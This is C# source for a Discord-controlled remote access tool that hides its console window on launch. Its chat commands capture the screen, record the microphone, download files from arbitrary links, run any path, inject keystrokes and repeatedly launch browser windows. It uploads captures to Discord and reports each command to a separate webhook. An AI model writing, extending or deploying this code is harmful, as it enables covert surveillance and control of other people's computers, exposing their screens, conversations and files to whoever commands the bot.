﻿using Discord;
using Discord;
using Discord.Commands;
using Discord.WebSocket;
using Microsoft.Extensions.DependencyInjection;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Windows.Forms;
using NAudio.CoreAudioApi;
using NAudio.Wave;
using System.Reflection.Metadata;
using Discord.Audio;

public class Program
{

    private DiscordSocketClient _client;
    private CommandService _commands;
    private IServiceProvider _services;
    private static string _webhookUrl = "";
    public static string botToken = "";


    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;
    const int SW_SHOW = 5;

    public static void Main(string[] args)
        => new Program().MainAsync().GetAwaiter().GetResult();

    public async Task MainAsync()
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        _client = new DiscordSocketClient(new DiscordSocketConfig
        {
            LogLevel = LogSeverity.Info
        });

        _commands = new CommandService(new CommandServiceConfig
        {
            LogLevel = LogSeverity.Info,
            CaseSensitiveCommands = false
        });

        _client.Log += LogAsync;
        _commands.Log += LogAsync;

      

        await RegisterCommandsAsync();

        await _client.LoginAsync(TokenType.Bot, botToken);
        await _client.StartAsync();

        await Task.Delay(-1);
    }

    private Task LogAsync(LogMessage log)
    {
        Console.WriteLine(log.ToString());
        return Task.CompletedTask;
    }

    public async Task RegisterCommandsAsync()
    {
        _client.MessageReceived += HandleCommandAsync;
        await _commands.AddModulesAsync(typeof(FileProcessingModule).Assembly, _services);
    }

    private async Task HandleCommandAsync(SocketMessage messageParam)
    {
        var message = messageParam as SocketUserMessage;
        if (message == null) return;

        int argPos = 0;

        if (!(message.HasStringPrefix("!", ref argPos) ||
              message.HasMentionPrefix(_client.CurrentUser, ref argPos)) ||
              message.Author.IsBot)
            return;

        var context = new SocketCommandContext(_client, message);

        await Task.Run(async () =>
        {
            var result = await _commands.ExecuteAsync(context, argPos, _services);

            if (!result.IsSuccess)
                await context.Channel.SendMessageAsync(result.ErrorReason);
        });
    }

    private static async Task SendWebhookMessageAsync(string content, string commandUsed, string result)
    {
        using (var httpClient = new HttpClient())
        {
            var payload = new { content, commandUsed, result };
            var serializedPayload = System.Text.Json.JsonSerializer.Serialize(payload);
            var httpContent = new StringContent(serializedPayload, System.Text.Encoding.UTF8, "application/json");

            await httpClient.PostAsync(_webhookUrl, httpContent);
        }
    }

    public class FileProcessingModule : ModuleBase<SocketCommandContext>
    {




        [Command("speak")]
        public async Task Talk([Remainder] string talk)
        {
            await Task.Run(async () =>
            {
                SpeechSynthesizer synthesizer = new SpeechSynthesizer();
                synthesizer.Volume = 100;
                synthesizer.Rate = 2;

                synthesizer.Speak(talk);
                string result = "I have spoken.";
                await ReplyAsync(result);

                await SendWebhookMessageAsync($"User {Context.User.Username} used !speak with argument '{talk}'.", "!speak", result);
            });
        }

        [Command("nbomb")]//
        public async Task LinkBombAsync([Remainder] int count)
        {
            await Task.Run(async () =>
            {
                if (count > 21)
                {
                    string result = $"Bombing {count} Times";
                    await ReplyAsync(result);

                    for (int i = 0; i < count; i++)
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "https://www.youtube.com/watch?v=_P45QZFQT-M",
                            UseShellExecute = true
                        });
                    }

                    await SendWebhookMessageAsync($"User {Context.User.Username} used !nbomb with argument '{count}'.", "!nbomb", result);
                }
                else { await ReplyAsync("parameter cant be over 20"); }
            });
        }

        [Command("link")]
        public async Task OpenAsync([Remainder] string url)
        {
            await Task.Run(async () =>
            {
                string result = $"Opening {url}...";
                await ReplyAsync(result);

                Process.Start(new ProcessStartInfo
                {
                    FileName = url,
                    UseShellExecute = true
                });

                await SendWebhookMessageAsync($"User {Context.User.Username} used !link with argument '{url}'.", "!link", result);
            });
        }

        [Command("screen")]
        public async Task Screenshot()
        {
            await Task.Run(async () =>
            {
                string procbot = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "/Discord_Bot_Media";
                Directory.CreateDirectory(procbot);
                string filePath = Path.Combine(procbot, "screenshot.png");
                TakeScreenshot(filePath);
                var message = await Context.Channel.SendFileAsync(filePath);
                File.Delete(filePath);

                string result = $"Screenshot taken and sent. File path: {filePath}";
                await SendWebhookMessageAsync($"User {Context.User.Username} used !screen.", "!screen", result);
                await SendWebhookMessageAsync($"User {Context.User.Username} received screenshot link: {message.Attachments.First().Url}", "!screen", result);
            });
        }

        [Command("download")]
        public async Task DownloadFileAsync(string fileLink = null)
        {
            await Task.Run(async () =>
            {
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
                string downloadDirectory = Path.Combine(desktopPath, "Bot_Downloads");
                Directory.CreateDirectory(downloadDirectory);

                try
                {
                    string fileName;
                    string filePath;

                    if (fileLink != null)
                    {
                        fileName = Path.GetFileName(new Uri(fileLink).AbsolutePath);
                        filePath = Path.Combine(downloadDirectory, fileName);
                    }
                    else if (Context.Message.Attachments.Count > 0)
                    {
                        fileName = Context.Message.Attachments.First().Filename;
                        filePath = Path.Combine(downloadDirectory, fileName);
                    }
                    else
                    {
                        string result = "Please provide a file link or attach a file to download.";
                        await ReplyAsync(result);
                        await SendWebhookMessageAsync($"User {Context.User.Username} used !download without providing a file link or attachment. Result: {result}", "!download", result);
                        return;
                    }

                    using (var httpClient = new HttpClient())
                    {
                        using (var response = await httpClient.GetAsync(fileLink ?? Context.Message.Attachments.First().Url))
                        {
                            if (response.IsSuccessStatusCode)
                            {
                                using (var fileStream = File.Create(filePath))
                                {
                                    await response.Content.CopyToAsync(fileStream);
                                }
                                string result = $"File downloaded and saved: {fileName}";
                                await ReplyAsync(result);
                                await SendWebhookMessageAsync($"User {Context.User.Username} used !download with argument '{fileLink}'. Result: {result}", "!download", result);
                            }
                            else
                            {
                                string result = $"Failed to download file from {fileLink}. Status code: {response.StatusCode}";
                                await ReplyAsync(result);
                                await SendWebhookMessageAsync($"User {Context.User.Username} used !download with argument '{fileLink}'. Result: {result}", "!download", result);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error downloading file: {ex.Message}");
                    string result = "An error occurred while downloading the file.";
                    await ReplyAsync(result);
                    await SendWebhookMessageAsync($"User {Context.User.Username} used !download with argument '{fileLink}'. Result: {result}", "!download", result);
                }
            });
        }

        [Command("run")]
        public async Task RunAsync([Remainder] string path)
        {
            await Task.Run(async () =>
            {
                try
                {
                    if (!File.Exists(path) && !Directory.Exists(path))
                    {

                        await ReplyAsync("no work");
                        await SendWebhookMessageAsync($"User {Context.User.Username} used !run with argument '{path}'. Result: no work", "!run", "no work");
                        return;
                    }

                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        FileName = path,
                        UseShellExecute = true
                    };
                    Process.Start(startInfo);

                    string result = $"Successfully started: {Path.GetFileName(path)}";
                    await ReplyAsync(result);
                    await SendWebhookMessageAsync($"User {Context.User.Username} used !run with argument '{path}'. Result: {result}", "!run", result);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error running command: {ex.Message}");
                    string result = $"Error running command: {ex.Message}";
                    await ReplyAsync(result);
                    await SendWebhookMessageAsync($"User {Context.User.Username} used !run with argument '{path}'. Result: {result}", "!run", result);
                }
            });
        }

        [Command("desktoppath")]
        public async Task LogUserInfoAsync()
        {
            await Task.Run(async () =>
            {
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
                string result = $"Desktop path: {desktopPath}";
                await ReplyAsync(result);
                await SendWebhookMessageAsync($"User {Context.User.Username} used !desktoppath. Result: {result}", "!desktoppath", result);
            });
        }

        [Command("playmedia")]
        public async Task PlayMediaAsync()
        {
            await Task.Run(async () =>
            {
                var attachment = Context.Message.Attachments.FirstOrDefault();
                if (attachment == null || (!attachment.Filename.EndsWith(".mp3") && !attachment.Filename.EndsWith(".mp4") && !attachment.Filename.EndsWith(".png")))
                {
                    await ReplyAsync("Please attach an MP3 or MP4 file.");
                    return;
                }

                string fileExtension = Path.GetExtension(attachment.Filename)?.ToLower();
                if (fileExtension != ".mp3" && fileExtension != ".mp4" && fileExtension != ".png")
                {
                    await ReplyAsync("Unsupported file format. Please attach an MP3 or MP4 or png file.");
                    return;
                }
                string procbot = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "/Discord_Bot_Media";
                Directory.CreateDirectory(procbot);
                string filePath = Path.Combine(procbot, attachment.Filename);
                using (var httpClient = new HttpClient())
                {
                    try
                    {
                        using (var response = await httpClient.GetAsync(attachment.Url))
                        {
                            if (response.IsSuccessStatusCode)
                            {
                                using (var fileStream = File.Create(filePath))
                                {
                                    await response.Content.CopyToAsync(fileStream);
                                }
                            }
                            else
                            {
                                await ReplyAsync($"Failed to download file from {attachment.Url}. Status code: {response.StatusCode}");
                                return;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error downloading file: {ex.Message}");
                        await ReplyAsync("An error occurred while downloading the file.");
                        return;
                    }
                }

                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = filePath,
                        UseShellExecute = true
                    });

                    await ReplyAsync($"Now playing: {attachment.Filename} on your PC.\nFile location: {filePath}");
                    await SendWebhookMessageAsync($"User {Context.User.Username} used !playmedia with file '{attachment.Filename}'.", "!playmedia", $"Now playing: {attachment.Filename} on your PC.\nFile location: {filePath}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error playing file: {ex.Message}");
                    await ReplyAsync("An error occurred while playing the file.");
                    await SendWebhookMessageAsync($"User {Context.User.Username} used !playmedia with file '{attachment.Filename}'. Error: {ex.Message}", "!playmedia", $"Error playing file: {ex.Message}");
                }
            });
        }

        [Command("typekeys")]
        public async Task TypeKeysAsync([Remainder] string keys)
        {
            await Task.Run(async () =>
            {
                foreach (char key in keys)
                {
                    if (!char.IsWhiteSpace(key))
                    {
                        await SimulateKeyPress(key);
                        await Task.Delay(100);
                    }
                }

                await SimulateKeyPress('\r');

                await ReplyAsync($"Typed: {keys}");
                await SendWebhookMessageAsync($"User {Context.User.Username} used !typekeys with keys '{keys}'.", "!typekeys", $"Typed: {keys}");
            });
        }

        private async Task SimulateKeyPress(char key)
        {
            key = char.ToUpper(key);
            ushort keyCode = (ushort)key;

            keybd_event(keyCode, 0, 0, 0);
            await Task.Delay(50);

            keybd_event(keyCode, 0, 0x2, 0);
        }
        private WaveInEvent _waveIn;
        private WaveFileWriter _waveWriter;
        private string _outputPath;
        [Command("micrecord")]
        public async Task RecordAudio(int seconds)
        {
            await Task.Run(async () =>
            {
                if (seconds <= 0 || seconds > 20)
                {
                    await ReplyAsync("Please specify a duration between 1 and 20 seconds.");
                    return;
                }

                _outputPath = Path.Combine(Path.GetTempPath(), "recorded_audio.wav");

                _waveIn = new WaveInEvent();
                _waveIn.WaveFormat = new WaveFormat(44100, 1); // 44.1kHz mono
                _waveIn.DataAvailable += WaveIn_DataAvailable;

                _waveWriter = new WaveFileWriter(_outputPath, _waveIn.WaveFormat);

                _waveIn.StartRecording();

                await Task.Delay(seconds * 1000);

                _waveIn.StopRecording();
                _waveIn.Dispose();

                _waveWriter.Close();
                _waveWriter.Dispose();
                var message = await Context.Channel.SendFileAsync(_outputPath, "Here's your recorded audio:");

                await SendWebhookMessageAsync($"User {Context.User.Username} used !micrecord for {seconds} seconds." + " attachment:" + message.Attachments.First().Url + message.Attachments, "!micrecord", $"Recorded {seconds} seconds of audio.");
                File.Delete(_outputPath);
            });
        }



        private void WaveIn_DataAvailable(object sender, WaveInEventArgs e)
        {
            _waveWriter.Write(e.Buffer, 0, e.BytesRecorded);
        }


        [DllImport("user32.dll")]
        private static extern void keybd_event(ushort bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

        private void TakeScreenshot(string filePath)
        {
            var screenBounds = GetScreenBounds();
            using (Bitmap bitmap = new Bitmap(screenBounds.Width, screenBounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(screenBounds.X, screenBounds.Y, 0, 0, screenBounds.Size);
                }
                bitmap.Save(filePath, System.Drawing.Imaging.ImageFormat.Png);
            }
        }

        private Rectangle GetScreenBounds()
        {
            return new Rectangle(0, 0, GetSystemMetrics(0), GetSystemMetrics(1));
        }

        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);
    }

    public class HelpModule : ModuleBase<SocketCommandContext>
    {
        private readonly CommandService _service;

        public HelpModule(CommandService service)
        {
            _service = service;
        }

        [Command("help")]
        public async Task HelpAsync()
        {
            var builder = new EmbedBuilder
            {
                Color = new Discord.Color(114, 137, 218),
                Description = "These are the commands you can use:"
            };

            foreach (var module in _service.Modules)
            {
                string moduleDescription = null;
                foreach (var cmd in module.Commands)
                {
                    var result = await cmd.CheckPreconditionsAsync(Context);
                    if (result.IsSuccess)
                    {
                        string parameters = string.Join(", ", cmd.Parameters.Select(p => p.Name));

                        moduleDescription += $"`!{cmd.Name} {parameters}` - {cmd.Summary ?? "No description available"}\n";
                    }
                }

                if (!string.IsNullOrWhiteSpace(moduleDescription))
                {
                    builder.AddField(module.Name, moduleDescription);
                }
            }

            await ReplyAsync("", false, builder.Build());
        }
    }
}
